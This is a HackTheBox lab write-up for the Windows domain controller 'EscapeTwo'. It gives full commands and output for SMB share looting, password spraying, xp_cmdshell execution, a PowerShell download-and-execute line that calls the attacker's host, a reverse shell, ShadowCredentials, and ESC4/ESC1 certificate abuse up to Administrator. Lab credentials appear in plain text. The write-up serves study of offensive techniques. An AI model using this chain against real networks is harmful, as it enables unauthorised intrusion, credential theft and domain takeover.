---
title: EscapeTwo
categories: [HackTheBox]
tags: [windows, ldap, kerberos, smb, nmap]
media_subpath: /images/hackthebox_escapetwo/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/d5fcf2425893a73cf137284e2de580e1.png'
---

# Summary

EscapeTwo is an easy HackTheBox machine that focuses on a Windows Active Directory environment exploitation. 

We started off with a `nmap` scan to enumerate the services running on the target machine, which revealed that it is a Windows domain controller for the `sequel.htb` domain. We then enumerated the `smb` shares and found some interesting files, including a spreasheet file that we used to perform a password spray against the target and find a pair of valid credentials. After gaining access to the [`mssql`](/theory/misc/sql) administrator user, letting us execute commands on the target machine and getting an initial foothold on the server. 

From there, we were able to escalate our privileges by finding reused passwords from a configuration file. From this new user, we abused a the [`DACL`](/theory/windows/AD/acl) permissions to escalate our privileges from [`WriteOwner`](/theory/windows/AD/acl#writeowner) permissions by giving us [`GenericAll`](/theory/windows/AD/acl#genericall) permissions over this other user, which allowed us to perform a [`ShadowCredentials`](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) attack and gain access to the target machine as this other user. 

Finally, from this last user, we were able to perform a [`ESC4`](/theory/windows/AD/adcs#esc4-template-hijacking) attack to gain access to the target machine as the `Administrator`.

---

## Nmap

```
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-05-25 03:44:34Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

The presence of `DNS`, `LDAP` and `Kerberos` services indicates that this is a Windows domain controller for the `sequel.htb` domain. We see a `MS SQL Server` running on port `1433`, which is a potential target for privilege escalation vectors. Besides that, we can enumerate more about the domain from the `ldap` and `smb`  protocols 

## (445) - SMB

### SMB Enumeration

Running the `nxc` tool, we can enumerate the shares on the target machine. I have added the given username, password, IP and domain as environment variables.

```bash
nxc smb $IP -u $USERAD -p $PASS --shares

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.11.51     445    DC01             Users           READ
```

To quickly enumerate the files on the readable shares, we can use the `spider_plus` module from `nxc`, this will spider every file and folder, saving the result on a `json` file.

```bash
nxc smb $FQDN -u $USERAD -p $PASS -M spider_plus -o EXCLUDE_FILTER='print$','ipc$','SYSVOL','NETLOGON' OUTPUT_FOLDER="$(pwd)/smb"
```

> Command Breakdown:
> - `-M spider_plus`: This module will spider the shares.
> - `-o EXCLUDE_FILTER='print$','ipc$','SYSVOL','NETLOGON'`: This will exclude the specified shares, even though SYSVOL and NETLOGON could be useful for enumeration and exploitation, they are default shares and we are not interested in them for now.
> - `OUTPUT_FOLDER="$(pwd)/smb"`: This will save the output in the current directory under the `smb` folder.
{: .prompt-info }

```bash
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.11.51     445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.11.51     445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.11.51     445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$', 'sysvol', 'netlogon']
SPIDER_PLUS 10.10.11.51     445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.11.51     445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.11.51     445    DC01             [*]  OUTPUT_FOLDER: /home/h4z4rd0u5/smb
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.11.51     445    DC01             Users           READ
SPIDER_PLUS 10.10.11.51     445    DC01             [+] Saved share-file metadata to "/home/h4z4rd0u5/smb/10.10.11.51.json".
SPIDER_PLUS 10.10.11.51     445    DC01             [*] SMB Shares:           7 (Accounting Department, ADMIN$, C$, IPC$, NETLOGON, SYSVOL, Users)
SPIDER_PLUS 10.10.11.51     445    DC01             [*] SMB Readable Shares:  5 (Accounting Department, IPC$, NETLOGON, SYSVOL, Users)
SPIDER_PLUS 10.10.11.51     445    DC01             [*] SMB Filtered Shares:  3
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Total folders found:  48
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Total files found:    61
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File size average:    25.85 KB
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File size min:        0 B
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File size max:        512 KB
```

### SMB File Enumeration

```bash
cat smb/10.10.11.51.json | jq '. | map_values(keys)' | grep -v 'lnk\|ini'
```
> `jq` Command Breakdown:
> - `map_values(keys)`: This will map the values of the `json`, iterating over each object and returning only the keys (top level).
> - `grep -v 'lnk\|ini'`: This will exclude the files with the extensions `lnk` and `ini`, which are not of interest for now and there are a lot of them.
{: .prompt-info }

```json
{
  "Accounting Department": [
    "accounting_2024.xlsx",
    "accounts.xlsx"
  ],
  "Users": [
    "Default/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml",
    "Default/AppData/Roaming/Microsoft/Windows/SendTo/Compressed (zipped) Folder.ZFSendToTarget",
    "Default/AppData/Roaming/Microsoft/Windows/SendTo/Desktop (create shortcut).DeskLink",
    "Default/AppData/Roaming/Microsoft/Windows/SendTo/Mail Recipient.MAPIMail",
    "Default/NTUSER.DAT",
    "Default/NTUSER.DAT.LOG1",
    "Default/NTUSER.DAT.LOG2",
    "Default/NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf",
    "Default/NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms",
    "Default/NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms",
  ]
}
```

From the output, we can see that there are two files of interest in the `Accounting Department` share, especially the `accounts.xlsx` file, which could contain sensitive information. With that information, we can retrieve the file using the `smbclient` command.

```bash
smbclient -U $USERAD "//$IP/Accounting Department/"
Password for [WORKGROUP\rose]:

Try "help" to get a list of possible commands.
smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (6.4 KiloBytes/sec) (average 6.4 KiloBytes/sec)
smb: \> exit
```

Trying to open the file with `libreoffice` or `xlsx2csv` will not work, as the file is corrupted. We can try to extract the contents of the file using the `unzip` binary, since `xlsx` files are basically just `zip` files for `xml` files. 

![NON](file-20250526000120881.png)

I listed the files with `7z` beforehand:

```bash
7z l accounts.xlsx

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 6780 bytes (7 KiB)

Listing archive: accounts.xlsx

--
Path = accounts.xlsx
Warning: The archive is open with offset
Type = zip
Physical Size = 6780

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-06-09 10:47:44 .....          681          224  xl/_rels/workbook.xml.rels
2024-06-09 10:47:44 .....          878          503  xl/workbook.xml
2024-06-09 10:47:44 .....         2257          542  xl/theme/theme1.xml
2024-06-09 10:47:44 .....         5593          706  xl/styles.xml
2024-06-09 10:47:44 .....          798          224  xl/worksheets/_rels/sheet1.xml.rels
2024-06-09 10:47:44 .....         4165         1252  xl/worksheets/sheet1.xml
2024-06-09 10:47:44 .....         1271          340  xl/sharedStrings.xml
2024-06-09 10:47:44 .....          718          238  _rels/.rels
2024-06-09 10:47:44 .....          731          356  docProps/core.xml
2024-06-09 10:47:44 .....          441          271  docProps/app.xml
2024-06-09 10:47:44 .....          241          151  docProps/custom.xml
2024-06-09 10:47:44 .....         1735          379  [Content_Types].xml
------------------- ----- ------------ ------------  ------------------------
2024-06-09 10:47:44              19509         5186  12 files
```

The file `xl/sharedStrings.xml` contains the strings used in the spreadsheet, which is where we will find potentially sensitive information. We can extract the file using either `unzip` or `7z`:

```bash
unzip accounts.xlsx xl/sharedStrings.xml

Archive:  accounts.xlsx
  inflating: xl/sharedStrings.xml

```

```bash
ls
 accounts.xlsx   xl

```

```bash
cat xl/sharedStrings.xml

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve"><REDACTED></t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve"><REDACTED></t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve"><REDACTED></t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve"><REDACTED></t></si></sst>%
```

To make it easier to parse the file, we can use `xmllint` to format the `xml` file and then use `grep` and `sed` to extract the strings. 

```bash
xmllint --format xl/sharedStrings.xml  | grep "<t" | sed -E 's/<\/?t[^>]*>//g' | sed 's/\s//g' | paste  -d'|' - - - - -
```
> Command Breakdown:
> - `xmllint --format xl/sharedStrings.xml`: This will format the xml file, making it easier to read.
> - `grep "<t"`: This will filter the lines that contain the `<t>` tag, which contains the strings.
> - `sed -E 's/<\/?t[^>]*>//g'`: This will remove the `<t>` and `</t>` tags from the output, because `<\/?t[^>]*>` will match any tag that starts with `<t` or `</t` and ends with `>`, including the closing tag.
> - `sed 's/\s//g'`: This will remove any whitespace from the output.
> - `paste -d'|' - - - -`: This will paste the output in columns, using `|` as the delimiter.
{: .prompt-info }

```bash
FirstName|LastName|Email|Username|Password
Angela|Martin|angela@sequel.htb|angela|<REDACTED>
Oscar|Martinez|oscar@sequel.htb|oscar|<REDACTED>
Kevin|Malone|kevin@sequel.htb|kevin|<REDACTED>
NULL|sa@sequel.htb|sa|<REDACTED>|
```

Since we have more passwords now, we can try password spraying against the previous users we found. We can use `kerbrute` to do this, as it is a great tool for password spraying against Kerberos. We could also use `nxc` to do this, but `kerbrute` is more efficient and faster. 

```bash
while IFS= read -r user; do
while IFS= read -r password; do
echo "${user}:${password}" >> user_pass
done < passwords
done < users
```
> Since we need a list on the format `username:password`, for `kerbrute` we can use a simple `while` loop to iterate over the users and passwords, creating a new file called `user_pass` with the format `username:password`.
> Command Breakdown:
> - `while IFS= read -r user; do`: This will read the users from the `users` file, one by one.
> - `while IFS= read -r password; do`: This will read the passwords from the `passwords` file, one by one.
> - `echo "${user}:${password}" >> user_pass`: This will append the username and password to the `user_pass` file, in the format `username:password`.
{: .prompt-info }

```bash

kerbrute bruteforce --dc $IP -d $DOMAIN ./user_pass

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 05/25/25 - Ronnie Flathers @ropnop

2025/05/25 18:41:37 >  Using KDC(s):
2025/05/25 18:41:37 >   10.10.11.51:88

2025/05/25 18:41:38 >  [+] VALID LOGIN:  oscar@sequel.htb:<REDACTED>
2025/05/25 18:41:39 >  Done! Tested 36 logins (1 successes) in 2.197 seconds
```

Or with `nxc`:

```bash
nxc smb $FQDN -u users -p passwords --continue-on-success

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
<SNIP>
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:<REDACTED>
<SNIP>
48.476 total
```

>We can see that the `kerbrute` took 2.97 seconds while `nxc` took `48.476`
{: .prompt-info}

We now have a valid user and password for the `oscar` user, since `oscar` is not member of any interesting group.

```bash
nxc ldap $FQDN -u $USERAD -p $PASS -M groupmembership -o USER=oscar

LDAP        10.10.11.51     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
GROUPMEM... 10.10.11.51     389    DC01             [+] User: oscar is member of following groups:
GROUPMEM... 10.10.11.51     389    DC01             Accounting Department
GROUPMEM... 10.10.11.51     389    DC01             Domain Users
```

But since there is a `mssql` server running on the target machine, and we found credentials for the `sa` user, we can try to use the `sa` user to connect to the server:

```bash
nxc mssql $FQDN -u sa -p '<REDACTED>'

MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [-] sequel.htb\sa:<REDACTED> (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')

nxc mssql $FQDN -u sa -p '<REDACTED>' --local-auth
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:<REDACTED> (Pwn3d!)
```

> We need to use the `--local-auth` flag because the `sa` user is a local user, not a domain user. The `sa` user is the default system administrator account for SQL Server, and it has full control over the SQL Server instance.
{: .prompt-info}

And we have access to the `mssql` server with the `sa` user. We can now use `nxc` to run commands on the target machine by enabling `xp_cmdshell`, which is a stored procedure that allows us to run commands on the target machine. 

```bash
nxc mssql $FQDN -u sa -p '<REDACTED>' --local-auth -M enable_cmdshell -o ACTION=enable

[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:<REDACTED> (Pwn3d!)
ENABLE_C... 10.10.11.51     1433   DC01             [+] xp_cmdshell successfully enabled.
```

And we can confirm code execution with the `whoami` command:

```bash
nxc mssql $FQDN -u sa -p '<REDACTED>' --local-auth -x "whoami"

MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:<REDACTED> (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.10.11.51     1433   DC01             sequel\sql_svc
```

With command execution on the target machine, we can now run a powershell reverse TCP from `nishang`, and we get access to the target host:

![NON](file-20250525185224247.png)

We could also have done this step manually from the `mssqlclient.py` from `impacket`:

```bash
mssqlclient.py $DOMAIN/sa:'<REDACTED>'@$FQDN

<SNIP>

SQL (sa  dbo@master)> xp_cmdshell
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

SQL (sa  dbo@master)> EXEC sp_configure 'show advanced options', 1
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE

SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE

SQL (sa  dbo@master)> xp_cmdshell "whoami"
output
--------------
sequel\sql_svc
```

`mssqlclient.py` can automate this process with the `enable_xp_cmdshell` command

```bash
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (sa  dbo@master)> xp_cmdshell "powershell -Command IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.27:8000/test\")"
S
```

![NON](file-20250525191221192.png)

## Horizontal Privilege Escalation

From the `SQL2019` folder found at the root folder of the system, we can find another password on the `sql-Configuration.INI` file, which is used to configure the `SQL Server` installation. 

```powershell
PS C:\SQL2019\ExpressAdv_ENU> type sql-Configuration.INI
<SNIP>
SQLSVCPASSWORD="<REDACTED>"
SAPWD="<REDACTED>"
```

Doing another password spray with the newly found password, we can find that ther user `ryan` uses the same password. 

```bash
nxc smb $FQDN -u users -p $(cat passwords | tail -n1)

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
<SNIP>
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ryan:<REDACTED>
```

### BloodHound

We can use `bloodhound` to enumerate the privileges of the `ryan` user. We can use the `SharpHound` tool to do this locally, since ryan has `WinRM` privileges over the machine, or we could do it remotely using `rusthound-ce` 

```bash
rusthound-ce -u "ryan" -p "<REDACTED>" -f "$FQDN" -d "$DOMAIN" -n "$IP" -c All -z
```

Looking at the `bloodhound` graph, we can see that the user `ryan` have `WriteOwner` permissions on the `ca_svc` user, which means that we can set the object owner to `ryan` and then give `GenericAll` permissions to the `ryan` user over the `ca_svc` user and then perform a `ShadowCredentials` attack (or many others like force password, targeted kerberoast). 

![NON](file-20250525203458900.png)

We can do this with the `owneredit.py` from `impacket`:

```
owneredit.py -new-owner ryan -target ca_svc -action write "$DOMAIN/ryan:<REDACTED>"

Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
```

Now we can set the `GenericAll` permissions to the `ryan` user over the `ca_svc` user:

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' "$DOMAIN/ryan:<REDACTED>"

Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20250525-200653.bak
[*] DACL modified successfully!
```

We can now perform a `ShadowCredentials` attack, which is possible to add “Key Credentials” to the attribute msDS-KeyCredentialLink of the target user/computer object and then perform Kerberos authentication as that account using PKINIT.

#### Impacket error

Here I've stumbled upon an error which I had seen in many other tools that used the `impacket` library, the `unsupported hash type MD4`

```bash
pywhisker -d "$DOMAIN" -u "ryan" -p "<REDACTED>" --target "ca_svc" --action "add"

[!] unsupported hash type MD4
```

From this post https://github.com/cannatag/ldap3/issues/1051, I've found that the workaround was to install the `pycryptodome` (or add this to the `requirements.txt` file). After installing this package, the command ran without problems

```bash
pywhisker -d "$DOMAIN" -u "ryan" -p "<REDACTED>" --target "ca_svc" --action "add"

[*] Searching for the target account
[*] Target user found: CN=Certification Authority,CN=Users,DC=sequel,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 330d8f4f-de77-cbbb-adac-81a9a2651be1
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: Ktbabwrq.pfx
[+] PFX exportiert nach: Ktbabwrq.pfx
[i] Passwort für PFX: B9gwqRARVxFWItyHJtCB
[+] Saved PFX (#PKCS12) certificate & key at path: Ktbabwrq.pfx
[*] Must be used with password: B9gwqRARVxFWItyHJtCB
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

gettgtpkinit -cert-pfx TanfQnvE.pfx  -pfx-pass KqH6jXJumKaPZvc9kgRC "$DOMAIN/ca_svc" ca_svc.ccache

2025-05-26 00:58:29,813 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-05-26 00:58:29,835 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-05-26 00:58:46,416 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-05-26 00:58:46,417 minikerberos INFO     cc7040891381fbdb8c5870aae76b1628d8baf97fa95f95432cf7de042ae6200c
INFO:minikerberos:cc7040891381fbdb8c5870aae76b1628d8baf97fa95f95432cf7de042ae6200c
2025-05-26 00:58:46,426 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

And we can authenticate using the generated `TGT`. Another tool (and even faster because it already tries to get the `TGT` ) is using the `certipy shadow auto`

```bash
certipy shadow \
    -u 'ryan' -p '<REDACTED>' \
    -dc-ip "$IP" -account 'ca_svc' \
    auto
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '941f7c7f-1e9c-905d-2334-ebe1eebc29ad'
[*] Adding Key Credential with device ID '941f7c7f-1e9c-905d-2334-ebe1eebc29ad' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '941f7c7f-1e9c-905d-2334-ebe1eebc29ad' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': <REDACTED>
```

From the `ca_svc` we can start to enumerate the `ADCS` for the server.
## Privilege Escalation With ADCS - ESC4/ESC1

```bash
certipy find -u 'ca_svc@sequel.htb' -hashes '<REDACTED>' -vulnerable -stdout

Certipy v5.0.2 - by Oliver Lyak (ly4k)

<SNIP>
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-05-25T20:21:28+00:00
    Template Last Modified              : 2025-05-25T20:21:28+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.

```

We found out that there is a `template` vulnerable to `ESC4`, which lets us to write to the template and make it vulnerable to an `ESC1` attack, the steps are as follows:

1. Write to the template
```bash
certipy template \
    -u 'ca_svc@sequel.htb' -hashes '<REDACTED>' \
    -dc-ip "$IP" -template 'DunderMifflinAuthentication' \
    -write-default-configuration
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'DunderMifflinAuthentication.json'
[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication_9781220a-0dcf-479a-86b9-bfcc9ea97ee2.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
<SNIP>
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'
```

If we run the `find` command again, we will see that the template is now vulnerable to `ESC1`

```bash
<SNIP>
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.
<SNIP>
```

Now, we can perform the `ESC1` attack by requesting the certificate with the `upn` from the `administrator`

```bash
certipy req \
    -u 'ca_svc@sequel.htb' -hashes '<REDACTED>' \
    -dc-ip "$IP" -target "$FQDN" \
    -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' \
    -upn 'administrator@sequel.htb' 

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificera pra moate with UPN 'administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-548670397-972687484-3496335370-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

We could use the generated ticket to authenticate, or get the hash from the `certipy auth` command:

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip $IP

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*]     SAN URL SID: 'S-1-5-21-548670397-972687484-3496335370-500'
[*]     Security Extension SID: 'S-1-5-21-548670397-972687484-3496335370-500'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
